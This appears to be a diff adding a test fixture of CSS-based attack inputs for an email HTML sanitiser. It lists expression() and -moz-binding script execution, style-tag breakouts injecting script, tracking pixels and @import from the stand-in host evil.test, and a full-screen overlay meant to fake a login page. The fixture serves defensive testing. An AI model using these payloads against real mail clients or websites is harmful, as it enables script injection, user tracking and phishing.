@@ -1,0 +1,35 @@
+<!-- family: CSS, in both places a mail can put it.
+     nh3 will happily emit `style="width:expression(alert(1))"` on its own --
+     verified against 0.3.7 -- so everything here is caught by the CSS
+     sanitiser behind the attribute filter, not by nh3's allow-lists. The
+     `@import`/`position:fixed` entries also guard the <style> extraction
+     path: a stylesheet that leaves the sanitiser must not be able to fetch
+     a remote resource or to lift an element out of the message frame. -->
+<div style="width:expression(alert(1))">IE expression()</div>
+<div style="WIDTH: EXPRESSION(alert(1))">upper-case expression()</div>
+<div style="width:expr/**/ession(alert(1))">comment-split expression()</div>
+<div style="behavior:url(#default#time2)">behavior</div>
+<div style="-moz-binding:url(http://evil.test/x.xml#xss)">-moz-binding</div>
+<div style="background-image:url(http://evil.test/px.gif)">tracking pixel via background-image</div>
+<div style="background:url('http://evil.test/px.gif') no-repeat">tracking pixel via background</div>
+<div style="background-image:url(&#104;ttp://evil.test/px.gif)">entity-split url()</div>
+<div style="list-style-image:url(http://evil.test/px.gif)">list-style-image</div>
+<div style="list-style:url(http://evil.test/px.gif)">list-style: an allow-listed property that still names a remote resource</div>
+<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647">
+  full-viewport overlay: this is the payload that turns a mail into a fake login page
+</div>
+<div style="position:absolute;top:-9999px">off-screen positioning</div>
+<div style="color:red;position:fixed">a safe declaration next to a hostile one</div>
+<div style="content:'</style><script>alert(1)</script>'">content breakout</div>
+<div style="filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0)">legacy filter</div>
+<div style="width:attr(data-x)">attr()</div>
+<div style="background-image:image-set('http://evil.test/a.png' 1x)">image-set()</div>
+<div style="width:calc(1px * url(http://evil.test/x))">url() nested inside calc()</div>
+<style>@import url("http://evil.test/x.css");</style>
+<style>@import "http://evil.test/x.css";</style>
+<style>@font-face{font-family:E;src:url(http://evil.test/f.woff)}</style>
+<style>p{background-image:url(http://evil.test/px.gif)}</style>
+<style>.overlay{position:fixed;top:0;left:0;width:100%;height:100%}</style>
+<style>@media screen{ .a{position:fixed} }</style>
+<style>p{font-family:"</style><img src=x onerror=alert(1)>"}</style>
+<style>a[title="</style><script>alert(1)</script>"]{color:red}</style>
